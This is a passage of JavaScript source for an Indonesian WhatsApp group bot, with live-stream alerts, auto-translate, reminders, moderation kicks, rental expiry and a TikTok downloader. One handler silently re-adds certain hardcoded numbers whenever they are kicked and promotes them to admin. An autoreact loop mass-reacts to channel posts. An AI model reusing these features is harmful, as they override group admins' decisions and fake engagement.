    `📅 *Tanggal:* ${waktu.date}\n` +
    `⏰ *Waktu:* ${waktu.time}\n` +
    `🎥 *Platform:* ${type}\n\n` +
    `🔗 *Link:*\n` +
    (showroomUrl ? `➡️ SHOWROOM: ${showroomUrl}\n` : '') +
    (idnUrl ? `➡️ IDN App: ${idnUrl}\n` : '') +
    (embedUrl ? `➡️ Embed: ${embedUrl}\n` : '') +
    `➡️ JKT48Connect: ${connectUrl}\n\n` +
    `Ayo nonton dan dukung Oshi kamu!`;
}
function makeYoutubeMessage(data) {
  return `🔴 *LIVE di YouTube!*\n\n` +
    `📺 *Channel:* ${data.channelTitle || "Unknown"}\n` +
    `📝 *Judul:* ${data.title || "Untitled"}\n` +
    `➡️ ${data.url || "#"}\n\n` +
    `Cek sekarang sebelum telat!`;
}
async function sendToAll(conn, msg) {
  for (const id of targetReceivers) {
    try {
      await conn.sendMessage(id, { text: msg });
    } catch (e) {
      console.log(`[ERROR] Gagal kirim ke ${id}:`, e.message);
    }
  }
}
async function checkLive(conn) {
  if (!isCheckingLive) return;
  try {
    const lives = await getLive(global.jkt48connect);
    if (!Array.isArray(lives)) return;
    for (const live of lives) {
      if (!live) continue;
      if (live.type === 'youtube') {
        if (sentYouTubeEvents.has(live.title)) continue;
        await sendToAll(conn, makeYoutubeMessage(live));
        sentYouTubeEvents.add(live.title);
      } else {
        if (sentEvents.has(live.name)) continue;
        const waktu = toWIB(live.started_at);
        await sendToAll(conn, makeMessage(live, waktu));
        sentEvents.add(live.name);
      }
    }
  } catch (err) {
    console.log('[ERROR] Gagal fetch live:', err.message);
  }
  setTimeout(() => checkLive(conn), 15000); 
}

// auto translate
global.autoTranslate = global.autoTranslate || {}
if (
  m.text &&
  !m.key.remoteJid?.includes('@g.us') && 
  !m.key.remoteJid?.includes('@newsletter')
) {
  const user = m.sender
  const targetData = global.autoTranslate[user]
  if (targetData?.status) {
    const translate = require('translate-google-api')
    const targetLang = targetData.lang || 'id'

    try {
      const result = await translate(m.text, { to: targetLang })
      const detectedLang = result?.[1]?.data?.detections?.[0]?.[0]?.language || "auto"
      if (detectedLang.toLowerCase() === targetLang.toLowerCase()) return
      await m.reply(`🔄 *AutoTranslate* dari *${detectedLang.toUpperCase()}* ke *${targetLang.toUpperCase()}*:\n${result[0]}`)
    } catch (err) {
      console.error('AutoTranslate Error:', err)
      await m.reply('⚠️ Gagal menerjemahkan teks.')
    }
  }
}

// reminder
//const moment = require('moment-timezone');
const reminders = [];
function parseDuration(input) {
  const match = input.match(/^(\d+)(s|m|h)$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  let ms = 0;
  if (unit === 's') ms = value * 1000;
  if (unit === 'm') ms = value * 60 * 1000;
  if (unit === 'h') ms = value * 60 * 60 * 1000;
  return ms;
}
function setReminder({ sender, reason, duration, name, reply }) {
  const endTime = Date.now() + duration;
  const timeFormatted = moment(endTime).tz('Asia/Jakarta').format('DD/MM, HH.mm');
  reply(`✅ Pengingat telah diterima.\n\n` +
    `– bot akan mengingatkanmu sesuai format yang kamu minta.\n` +
    `– ⏰ waktu : ${duration / 60000}m\n` +
    `– 📍 untuk : ${reason}`);
  setTimeout(() => {
    reply(`⏰ *KRING!! KRINGG!! KRINGGG!!!*\n\n` +
      `– haii @${sender.split("@")[0]}, sudah waktunya *${reason}*`, { mentions: [sender] });
  }, duration);
  reminders.push({ sender, reason, endTime, timeFormatted });
}

// anti video
// const fs = require('fs');
// const path = require('path');
const biyuoep = path.join(__dirname, './database');
const antivideoPath = path.join(biyuoep, 'antivideo.json');
if (!fs.existsSync(biyuoep)) fs.mkdirSync(biyuoep);
if (!fs.existsSync(antivideoPath)) fs.writeFileSync(antivideoPath, JSON.stringify({ status: {}, warn: {} }, null, 2));
let antivideoDB = JSON.parse(fs.readFileSync(antivideoPath));
function saveAntivideo() {
  fs.writeFileSync(antivideoPath, JSON.stringify(antivideoDB, null, 2));
}
if (antivideoDB.status[m.chat] && m.isGroup && m.type === 'videoMessage') {
  if (m.isAdmin || m.key.fromMe) return;
  if (!m.isBotAdmin) return;
  const sender = m.sender;
  if (!antivideoDB.warn[m.chat]) antivideoDB.warn[m.chat] = {};
  if (!antivideoDB.warn[m.chat][sender]) antivideoDB.warn[m.chat][sender] = 0;
  antivideoDB.warn[m.chat][sender]++;
  const warn = antivideoDB.warn[m.chat][sender];
  saveAntivideo();
  if (warn < 3) { // max kick
    conn.sendMessage(m.chat, { delete: m.key });
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} jangan kirim video! Ini peringatan ke-${warn}/3.`,
      mentions: [sender]
    });
  } else {
    await conn.groupParticipantsUpdate(m.chat, [sender], 'remove');
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} telah dikick karena melanggar aturan (kirim video 3x).`,
      mentions: [sender]
    });
    antivideoDB.warn[m.chat][sender] = 0;
    saveAntivideo();
  }
}

// anti sticker
// const fs = require('fs');
// const path = require('path');
const yubixpp = path.join(__dirname, './database');
const antistickerPath = path.join(yubixpp, 'antisticker.json');
if (!fs.existsSync(yubixpp)) fs.mkdirSync(yubixpp);
if (!fs.existsSync(antistickerPath)) fs.writeFileSync(antistickerPath, JSON.stringify({ status: {}, warn: {} }, null, 2));
let antistickerDB = JSON.parse(fs.readFileSync(antistickerPath));
function saveAntisticker() {
  fs.writeFileSync(antistickerPath, JSON.stringify(antistickerDB, null, 2));
}
if (antistickerDB.status[m.chat] && m.isGroup && m.type === 'stickerMessage') {
  if (m.isAdmin || m.key.fromMe) return;
  if (!m.isBotAdmin) return;
  const sender = m.sender;
  if (!antistickerDB.warn[m.chat]) antistickerDB.warn[m.chat] = {};
  if (!antistickerDB.warn[m.chat][sender]) antistickerDB.warn[m.chat][sender] = 0;
  antistickerDB.warn[m.chat][sender]++;
  const warn = antistickerDB.warn[m.chat][sender];
  saveAntisticker();
  if (warn < 3) { // max buat kick
    conn.sendMessage(m.chat, { delete: m.key });
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} jangan kirim stiker! Ini peringatan ke-${warn}/3.`,
      mentions: [sender]
    });
  } else {
    await conn.groupParticipantsUpdate(m.chat, [sender], 'remove');
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} telah dikick karena melanggar aturan (kirim stiker 3x).`,
      mentions: [sender]
    });
    antistickerDB.warn[m.chat][sender] = 0;
    saveAntisticker();
  }
}

/*// anti spam
global.userSpam = global.userSpam || {};
global.userBlocked = global.userBlocked || {};
global.groupWarned = global.groupWarned || {};
const spamWindow = 2 * 1000; // dalam 2 detik
const spamLimit = 3; // maksimal 3x cmd
const blockTime = 10 * 1000; // ban 10 detik
const now = Date.now();
const sender = m.sender;
const isPrivateChat = m.chat.endsWith('@s.whatsapp.net');
const biyuzxn = m.isGroup;
if (global.userBlocked[sender]) return;
if (!global.userSpam[sender]) global.userSpam[sender] = [];
global.userSpam[sender].push(now);
global.userSpam[sender] = global.userSpam[sender].filter(ts => now - ts <= spamWindow);
if (isPrivateChat && global.userSpam[sender].length >= spamLimit) {
  global.userBlocked[sender] = true;
  global.userSpam[sender] = [];
  await m.reply('🚫 Kamu terlalu cepat kirim perintah!\nBot akan nge-block kamu selama 10 detik... santai dulu ya.');
  await new Promise(resolve => setTimeout(resolve, 1000));
  await conn.updateBlockStatus(sender, 'block');
  console.log(`[ANTI-SPAM] ${sender} diblokir karena spam di private chat.`);
  setTimeout(async () => {
// buat unblock
    await conn.updateBlockStatus(sender, 'unblock');
    delete global.userBlocked[sender];
    console.log(`[ANTI-SPAM] ${sender} sudah di-unblock otomatis.`);
  }, blockTime);
}
if (biyuzxn && global.userSpam[sender].length >= spamLimit) {
  const warnKey = `${m.chat}|${sender}`;
  if (!global.groupWarned[warnKey]) {
    global.groupWarned[warnKey] = true;
    await m.reply('⚠️ Kamu terlalu cepat kirim command!\nCooldown 10 detik dulu ya biar gak dianggap spam.');
    setTimeout(() => delete global.groupWarned[warnKey], blockTime);
  }
}*/

// register
/*const fs = require('fs');
const path = require('path');
const moment = require('moment-timezone');*/
const dbFolder = path.join(__dirname, 'database');
const userFile = path.join(dbFolder, 'users.json');
if (!fs.existsSync(dbFolder)) fs.mkdirSync(dbFolder);
if (!fs.existsSync(userFile)) fs.writeFileSync(userFile, '{}');
let userData = JSON.parse(fs.readFileSync(userFile));
const idch = '120363403261361342@newsletter'; 


// total chat
//const fs = require('fs')
// const path = require('path')
const statsFolder = path.join(__dirname, './db')
const statsFile = path.join(statsFolder, 'groupStats.json')
if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder)
if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}')
function loadStats() {
  return JSON.parse(fs.readFileSync(statsFile))
}
function saveStats(data) {
  fs.writeFileSync(statsFile, JSON.stringify(data, null, 2))
}
function updateStats(chatId, senderId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  if (!data[chatId]) data[chatId] = {}
  if (!data[chatId][today]) data[chatId][today] = {}
  if (!data[chatId][today][senderId]) data[chatId][today][senderId] = 0
  data[chatId][today][senderId]++
  saveStats(data)
}
function getTodayStats(chatId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  return data[chatId]?.[today] || {}
}
updateStats(m.chat, m.sender)

// sewa
// const cron = require('node-cron');
// const fs = require('fs');
const yubixz = './database/sewa.json';
function loadSewa() {
  try {
    return JSON.parse(fs.readFileSync(yubixz));
  } catch {
    return [];
  }
}
function saveSewa(data) {
  fs.writeFileSync(yubixz, JSON.stringify(data, null, 2));
}
let isSewa = false;
if (m.isGroup) {
  const dataSewa = loadSewa();
  const aktif = dataSewa.find(d => d.jid === m.chat && d.expired > Date.now());
  isSewa = !!aktif;
}
cron.schedule('*/5 * * * *', async () => {
  const data = loadSewa();
  const now = Date.now();
  for (let i = 0; i < data.length; i++) {
    const d = data[i];
    const sisa = d.expired - now;
    if (sisa <= 0) {
      try {
        await conn.groupLeave(d.jid);
        console.log(`Keluar dari ${d.jid} karena sewa habis`);
        fs.appendFileSync('log-sewa.txt', `Keluar dari ${d.jid} - ${new Date().toLocaleString()}\n`);
      } catch (e) {
        console.log('Gagal keluar dari grup:', d.jid);
      }
      data.splice(i, 1);
      i--;
      continue;
    }
    if (sisa <= 10 * 60 * 1000 && !d.warningSent) {
      try {
        const metadata = await conn.groupMetadata(d.jid);
        const adminTag = metadata.participants
          .filter(p => p.admin)
          .map(p => '@' + p.id.split('@')[0])
          .join(' ');
        await conn.sendMessage(d.jid, {
          text: `*PERINGATAN*\nSewa bot akan habis dalam 10 menit!\n${adminTag}`,
          mentions: metadata.participants.map(p => p.id)
        });
        d.warningSent = true;
      } catch (e) {
        console.log('err:', d.jid);
      }
    }
  }
  saveSewa(data);
});

// akses
// const fs = require('fs');
const aksesGrupPath = './aksesgrup.json';
if (!fs.existsSync(aksesGrupPath)) {
  fs.writeFileSync(aksesGrupPath, JSON.stringify({ groups: [] }, null, 2));
}
const aksesGrup = JSON.parse(fs.readFileSync(aksesGrupPath));
function saveAksesGrup() {
  fs.writeFileSync(aksesGrupPath, JSON.stringify(aksesGrup, null, 2));
}
function isGroupAllowed(chatId) {
  return aksesGrup.groups.includes(chatId);
}

// banchat
// const fs = require('fs');
const banchatFile = './database/banchat.json';
if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(banchatFile)) fs.writeFileSync(banchatFile, '[]');
let banchat = JSON.parse(fs.readFileSync(banchatFile));
if (banchat.includes(m.chat) && !['banchat', 'unbanchat', 'listbanchat'].includes(command)) {
  return;
}

// blacklist
// const fs = require('fs');
// const path = require('path');
const dirDB = path.join(__dirname, 'database');
const blacklistPath = path.join(dirDB, 'blacklist.json');
if (!fs.existsSync(dirDB)) fs.mkdirSync(dirDB);
if (!fs.existsSync(blacklistPath)) fs.writeFileSync(blacklistPath, '[]');
function saveBlacklist(data) {
  fs.writeFileSync(blacklistPath, JSON.stringify(data, null, 2));
}
function loadBlacklist() {
  return JSON.parse(fs.readFileSync(blacklistPath));
}
conn.ev.on('messages.upsert', async ({ messages }) => {
  const m = messages[0];
  if (!m.message || !m.key.remoteJid.endsWith('@g.us')) return;
  const sender = m.key.participant || m.key.remoteJid;
  const nomor = sender.replace(/[^0-9]/g, '');
  const blacklist = loadBlacklist();
  if (blacklist.includes(nomor)) {
    try {
      await conn.sendMessage(m.key.remoteJid, {
        delete: {
          remoteJid: m.key.remoteJid,
          fromMe: false,
          id: m.key.id,
          participant: sender
        }
      });
      console.log(`Pesan dari ${nomor} dihapus (ada blacklist).`);
    } catch (e) {
      console.error('Lu Bukan Admin Kali:', e);
    }
  }
});

// anti bot
global.botWarnings = global.botWarnings || {}
global.antibotGroups = global.antibotGroups || {}
function getTextFromMsg(msg) {
  try {
    return (
      msg?.conversation ||
      msg?.extendedTextMessage?.text ||
      msg?.imageMessage?.caption ||
      msg?.videoMessage?.caption ||
      msg?.documentMessage?.caption ||
      msg?.buttonsMessage?.contentText ||
      msg?.templateMessage?.hydratedTemplate?.hydratedContentText ||
      msg?.listMessage?.description ||
      msg?.viewOnceMessage?.message?.conversation ||
      ''
    ).toLowerCase()
  } catch {
    return ''
  }
}
if (
  m.isGroup &&
  !isCreator &&
  !isOwner &&
  global.antibotGroups[m.chat]
) {
  const groupId = m.chat
  const sender = m.sender
  const pushName = m.pushName?.toLowerCase() || ''
  const textMsg = getTextFromMsg(m.message)
  const ctx =
    m.message?.extendedTextMessage?.contextInfo ||
    m.message?.imageMessage?.contextInfo ||
    m.message?.videoMessage?.contextInfo ||
    m.message?.documentMessage?.contextInfo ||
    m.message?.buttonsMessage?.contextInfo ||
    m.message?.templateMessage?.contextInfo ||
    {}
  let isPossibleBot =
    pushName.match(/botz|bot|wa bot|whatsapp bot/) ||
    textMsg.match(/hallo pengguna|silakan tekan tombol|permintaan anda sedang diproses/i) ||
    textMsg.match(/hello user|please wait|click the button|your request is being processed/i) ||
    ctx.externalAdReply != null ||
    ctx.forwardedNewsletterMessageInfo != null
  if (isPossibleBot) {
    global.botWarnings[groupId] = global.botWarnings[groupId] || {}
    global.botWarnings[groupId][sender] = (global.botWarnings[groupId][sender] || 0) + 1
    const warnCount = global.botWarnings[groupId][sender]
    if (warnCount <= 2) { // max warn ubah ae
      await conn.sendMessage(groupId, {
        text: `⚠️ *Antibot aktif!*\nBot tidak diizinkan di grup ini!\nPeringatan ke-${warnCount}/3`,
        mentions: [sender]
      })
      await conn.sendMessage(groupId, { delete: m.key }).catch(() => {})
    } else {
      await conn.sendMessage(groupId, {
        text: `Bot @${sender.split('@')[0]} telah dikeluarkan dari grup karena melanggar aturan.`,
        mentions: [sender]
      })
      await conn.groupParticipantsUpdate(groupId, [sender], 'remove').catch(() =>
        conn.sendMessage(groupId, { text: '⚠️ Gagal kick bot. Mungkin bot bukan admin.' })
      )
      delete global.botWarnings[groupId][sender]
    }
  }
}

// anti foto
// const fs = require('fs');
// const path = require('path');
const dbPath = path.join(__dirname, './database');
const yubixpath = path.join(dbPath, 'antifoto.json');
if (!fs.existsSync(dbPath)) fs.mkdirSync(dbPath);
if (!fs.existsSync(yubixpath)) fs.writeFileSync(yubixpath, JSON.stringify({ warn: {} }, null, 2));
let antifotoDB = JSON.parse(fs.readFileSync(yubixpath));
function saveAntifoto() {
  fs.writeFileSync(yubixpath, JSON.stringify(antifotoDB, null, 2));
}
if (antifotoDB[m.chat] && m.isGroup && m.type === 'imageMessage') {
  if (m.isAdmin || m.key.fromMe) return;
  if (!m.isBotAdmin) return;
  const sender = m.sender;
  if (!antifotoDB.warn) antifotoDB.warn = {};
  if (!antifotoDB.warn[m.chat]) antifotoDB.warn[m.chat] = {};
  if (!antifotoDB.warn[m.chat][sender]) antifotoDB.warn[m.chat][sender] = 0;
  antifotoDB.warn[m.chat][sender]++;
  const warn = antifotoDB.warn[m.chat][sender];
  saveAntifoto();
  if (warn < 3) { // ubah max kick
    conn.sendMessage(m.chat, { delete: m.key });
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} jangan kirim foto! Ini peringatan ke-${warn}/3.`,
      mentions: [sender]
    });
  } else {
    await conn.groupParticipantsUpdate(m.chat, [sender], 'remove');
    await conn.sendMessage(m.chat, {
      text: `@${sender.split('@')[0]} telah dikick karena melanggar aturan (kirim foto 3x).`,
      mentions: [sender]
    });
    antifotoDB.warn[m.chat][sender] = 0;
    saveAntifoto();
  }
}
        
// auto add
const protectedGroups = [
    '120363391086680325@g.us', // ubah ae ini idgb yg khusus buat auto add
    '120363280879265754@g.us',
    '120363316043279692@g.us'
];
const protectedNumbers = [
    '6285776461481', // ubah ae ini nomer auto add klau ke kick
    '62857764614810',
    '62895640071400'
];
conn.ev.on('group-participants.update', async (update) => {
    try {
        const { id, participants, action } = update;
        if (!protectedGroups.includes(id)) return;
        if (action === 'remove') {
            for (const number of protectedNumbers) {
                const jid = number + '@s.whatsapp.net';
                if (participants.includes(jid)) {
                    console.log(`⚠️ Nomor ${jid} di-kick dari grup ${id}`);
                    const groupMetadata = await conn.groupMetadata(id);
                    const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
                    const botAdmin = groupMetadata.participants.find(p => p.id === botNumber && p.admin);
                    if (botAdmin) {
                        console.log('✅ Bot adalah admin, mencoba add kembali...');
                        await conn.groupParticipantsUpdate(id, [jid], 'add');
                        console.log(`✅ Berhasil add ${jid} kembali ke grup!`);
                        // ini pas udh di add sung jdi atmin
                        await new Promise(resolve => setTimeout(resolve, 3000)); 
                        console.log(`⏫ Mencoba promote ${jid} jadi admin...`);
                        await conn.groupParticipantsUpdate(id, [jid], 'promote');
                        console.log(`✅ Berhasil promote ${jid} jadi admin!`);
                    } else {
                        console.log('ℹ️ Bot bukan admin di grup ini, tidak bisa add.');
                    }
                }
            }
        }
    } catch (err) {
        console.error('❌ Error di auto-add:', err);
    }
});

// upch 
let targetChannelData = { id: '120363403261361342@newsletter' };
const loadTargetChannel = () => {
    try {
        if (fs.existsSync('./targetChannel.json')) {
            const file = fs.readFileSync('./targetChannel.json');
            targetChannelData = JSON.parse(file);
        } else {
            saveTargetChannel(); 
        }
    } catch (err) {
        console.error('Gagal load target channel:', err);
    }
};
const saveTargetChannel = () => {
    try {
        fs.writeFileSync('./targetChannel.json', JSON.stringify(targetChannelData, null, 2));
    } catch (err) {
        console.error('Gagal save target channel:', err);
    }
};
loadTargetChannel();

// auto reaction channel
const biyuui = "./autoreact.json";
if (!fs.existsSync(biyuui)) fs.writeFileSync(biyuui, "{}");
function loadAutoreact() {
   try {
      return JSON.parse(fs.readFileSync(biyuui));
   } catch {
      return {};
   }
}
function saveAutoreact(data) {
   fs.writeFileSync(biyuui, JSON.stringify(data, null, 2));
}
global.autoreactDB = loadAutoreact();
let autoreactInterval = null;
async function startAutoreactLoop(conn) {
   if (autoreactInterval) return; 
   autoreactInterval = setInterval(async () => {
      for (const [channelId, data] of Object.entries(global.autoreactDB)) {
         let metadata;
         try {
            metadata = await conn.newsletterMetadata("invite", channelId);
         } catch {
            continue;
         }
         let success = 0;
         for (let i = 0; i < 100; i++) {
            const msgId = (data.lastId + i).toString();
            try {
               await new Promise(resolve => setTimeout(resolve, 2000));
               await conn.newsletterReactMessage(metadata.id, msgId, data.emoji);
               success++;
            } catch {
               break;
            }
         }
         if (success > 0) {
            global.autoreactDB[channelId].lastId += success;
            saveAutoreact(global.autoreactDB);
         }
      }
   }, 75_000);
}
startAutoreactLoop(conn);

// anti call
let anticall = false
let callWarning = {} 
conn.ws.on('CB:call', async (json) => {
  if (!anticall) return
  let call = json.content[0]
  if (call.tag === 'offer') {
    let callerId = json.attrs.from
    if (!callWarning[callerId]) {
      callWarning[callerId] = 1 // ubah aj max block
      await conn.sendMessage(callerId, {
        text: '*[PERINGATAN CALL]*\n\nJangan menelpon bot! Jika Anda menelpon lagi, Anda akan diblokir otomatis.',
      })
    } else {
      await conn.sendMessage(callerId, {
        text: '*[ANTI-CALL]*\n\nAnda sudah diperingatkan. Karena masih menelpon, Anda sekarang diblokir.',
      })
      await new Promise(resolve => setTimeout(resolve, 1000))
      await conn.updateBlockStatus(callerId, 'block')
      delete callWarning[callerId] 
    }
  }
})

// autoreactionsw
const Func = {
random: (arr) => arr[Math.floor(Math.random() * arr.length)]
}
conn.autoReactionSW = conn.autoReactionSW || false
if (conn.autoReactionSW) {
conn.storyJid = conn.storyJid ? conn.storyJid : []
if (
m.chat.endsWith('broadcast') &&
!conn.storyJid.includes(m.sender) &&
m.sender != conn.decodeJid(conn.user.id)
) {
conn.storyJid.push(m.sender)
}
if (
m.chat.endsWith('broadcast') &&
[...new Set(conn.storyJid)].includes(m.sender) &&
!/protocol/.test(m.mtype)
) {
await conn.sendMessage(
'status@broadcast',
{
react: {
text: Func.random(['🤣', '🥹', '😂', '😋', '😎', '🤓', '🤪', '🥳', '😠', '😱', '🤔', '🥶']),
key: m.key
}
},
{
statusJidList: [m.sender]
}
)
}
}

// auto download titkok
if (/https?:\/\/(vt|www)\.tiktok\.com\/[^\s]+/.test(m.text)) {
  const axios = require('axios');
  const tiktokDl = async (url) => {
    try {
      let data = [];
      const domain = 'https://www.tikwm.com/api/';
      let res = (await axios.post(domain, {}, {
        headers: {
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'Accept-Language': 'id-ID,id;q=0.9',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.tikwm.com',
          'Referer': 'https://www.tikwm.com/',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
          'X-Requested-With': 'XMLHttpRequest'
        },
        params: {
          url: url,
          count: 12,
          cursor: 0,
          web: 1,
          hd: 1
        }
      })).data.data;

      if (res?.duration == 0) {
        for (const img of res.images) {
          data.push({ type: 'photo', url: img });
        }
      } else {
        data.push(
          { type: 'watermark', url: 'https://www.tikwm.com' + res?.wmplay || "/undefined" },
          { type: 'nowatermark', url: 'https://www.tikwm.com' + res?.play || "/undefined" },
          { type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res?.hdplay || "/undefined" }
        );
      }

      return {
        status: true,
        title: res.title,
        duration: res.duration,
        cover: 'https://www.tikwm.com' + res.cover,
        music_info: {
          title: res.music_info.title,
          author: res.music_info.author,
          url: 'https://www.tikwm.com' + res.music || res.music_info.play
        },
        author: {
          fullname: res.author.unique_id,
          nickname: res.author.nickname
        },
        data
      };
    } catch {
      return { status: false };
    }
  };

  try {
    const q = m.text.match(/https?:\/\/(vt|www)\.tiktok\.com\/[^\s]+/)[0];
    const res = await tiktokDl(q);
    if (!res.status) return;

    let { title, duration, music_info, data, author } = res;

    if (data.every(x => x.type === 'photo')) {
      let first = data[0];
      let others = data.slice(1);

      await conn.sendMessage(m.chat, {
        image: { url: first.url },
        caption: `*${title}*\nDurasi: ${duration} detik\nBy: @${author.fullname}`
      }, { quoted: m });

      for (const img of others) {
        await conn.sendMessage(m.sender, {
          image: { url: img.url },
          jpegThumbnail: null
        });
      }
    } else {
      let videoUrl = data.find(x => x.type == 'nowatermark_hd')?.url || data.find(x => x.type == 'nowatermark')?.url;
      let audioUrl = music_info.url;

      await conn.sendMessage(m.chat, {
        video: { url: videoUrl },
        caption: `*${title}*\nDurasi: ${duration} detik\nBy: @${author.fullname}`
      }, { quoted: m });

      await conn.sendMessage(m.chat, {
        audio: { url: audioUrl },
        mimetype: 'audio/mp4'
      }, { quoted: m });
    }
  } catch {}
}

// anti tag sw
if (m.message?.groupStatusMentionMessage && db?.data?.chats[m.chat]?.antitagsw?.status) {
  let user = m.key.participant
  let data = db.data.chats[m.chat].antitagsw
  if (!data.count) data.count = {}
  if (!data.count[user]) data.count[user] = 1
  else data.count[user]++
  if (data.count[user] >= 2) { // Ubah max kick di sini kalau mau
    await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
    delete data.count[user]
  } else {
    await conn.sendMessage(m.chat, {
      text: `@${user.split('@')[0]} jangan tag sw! (${data.count[user]}/2)`,
      mentions: [user]
    })
  }
}

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
Info : ${global.linkGrup}

Di Link Tersebut Ada Mengenai Informasi Tentang ${global.namaOwner} :v dan juga ada yang gratis lhoo.. 
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

// auto koreksi
if (isCmd) {
    if (command) {
        try {
            const code = fs.readFileSync("biyu.js", "utf8");
            var regex = /case\s+'([^']+)':/g;
            var matches = [];
            var match;
            while ((match = regex.exec(code))) {
                matches.push(match[1]);
            }
            const help = Object.values(matches)
                .flatMap(v => v ?? []) 
                .map(entry => entry.trim().split(' ')[0].toLowerCase())
                .filter(Boolean); 
            if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
                let mean = didyoumean(command, help); 
                let sim = similarity(command, mean); 
                let similarityPercentage = parseInt(sim * 100);
                if (mean && command.toLowerCase() !== mean.toLowerCase()) {
                    const pesanTemplate = `🚫 Command Tidak Ditemukan!\nKami Mendeteksi Mungkin Yang Kamu Maksud\n\n➠ *${prefix + mean}* (${similarityPercentage}%)\n`;
                    conn.sendMessage(m.chat, {
                        image: { url: "https://files.catbox.moe/zxnzgb.jpeg" }, 
                        caption: pesanTemplate,
                        footer: botname,
                        buttons: [
                            {
                                buttonId: prefix + mean,
                                buttonText: {
                                    displayText: prefix + mean
                                }
                            }
                        ],
                        viewOnce: true,
                    }, {
                        quoted: xy 
                    });
                }
            }
        } catch (err) {
            console.error('Error membaca file atau mengirim pesan:', err);
        }
    }
}

// auto welcome owner
const ownerList = [
  {
    jid: '628118189945@s.whatsapp.net',
    pesan: 'Owner Telah Muncul 🥵😏🤗',
    audioLinks: [
    'https://files.catbox.moe/figcu0.mpeg', // link mp3
    ]
  },
  {
    jid: '628118189945@s.whatsapp.net',
    pesan: '📣 Eh Si owner  Muncul :v, Haloo Sayangg 🤗',
    audioLinks: [
     'https://files.catbox.moe/figcu0.mpeg', 
    'https://files.catbox.moe/kuskgu.mpeg' // kalau mau biar random, kirim audio nya 
    ]
  },
  // Tambahin anu mu lagi disini kyk diatas 
];
if (!global.sambutanCooldown) global.sambutanCooldown = {};
const currentTimee = Math.floor(Date.now() / 1000); 
const isGroup = m.isGroup;
if (isGroup && m.sender && m.sender !== conn.user.jid) { 
  const ownerData = ownerList.find(owner => owner.jid === m.sender);
  const lastTime = global.sambutanCooldown[m.chat] || 0;
  if (ownerData && ownerData.jid !== conn.user.jid && currentTimee >= lastTime) { 
    const metadata = await conn.groupMetadata(m.chat);
    const participants = metadata.participants || [];
    const mentionedUsers = participants.map(p => p.id).filter(id => id !== conn.user.id);
    const isSendAudio = Math.random() < 0.4; // Buat Random =50% audio, lu atur aj
    if (isSendAudio && ownerData.audioLinks?.length) {
      const randomAudio = ownerData.audioLinks[Math.floor(Math.random() * ownerData.audioLinks.length)];
      await conn.sendMessage(m.chat, {
        audio: { url: randomAudio },
        mimetype: 'audio/mpeg',
        ptt: true, // ubah ke false klau mau file audio, kalau true kyk vn
     //  mentions: mentionedUsers kyk hidetag 
      }, { quoted: m });
    } else if (ownerData.pesan) {
      await conn.sendMessage(m.chat, {
        text: ownerData.pesan,
       // mentions: mentionedUsers kyk hidetag 
      }, { quoted: m });
    }
